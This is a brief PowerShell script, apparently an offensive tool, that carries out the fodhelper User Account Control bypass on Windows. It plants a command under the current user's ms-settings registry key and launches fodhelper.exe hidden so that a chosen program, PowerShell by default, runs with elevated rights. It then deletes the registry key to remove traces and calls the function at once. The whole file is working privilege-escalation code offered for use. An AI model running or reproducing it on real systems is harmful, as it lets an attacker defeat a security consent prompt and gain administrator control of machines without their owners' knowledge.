function Bypass-Fodhelper {
    param($x='powershell.exe') #You can also use your own programs but use the full path

    $h='HKCU:\Software\Classes\ms-settings\Shell\Open\command'
    Invoke-Expression "New-Item '$h' -Force"
    Invoke-Expression "New-ItemProperty -Path '$h' -Name DelegateExecute -Value '' -Force"
    Invoke-Expression "Set-ItemProperty -Path '$h' -Name '(default)' -Value $x -Force"

    Start-Process 'C:\Windows\System32\fodhelper.exe' -WindowStyle Hidden

    Start-Sleep -Seconds 3
    Invoke-Expression "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force"
}

Bypass-Fodhelper
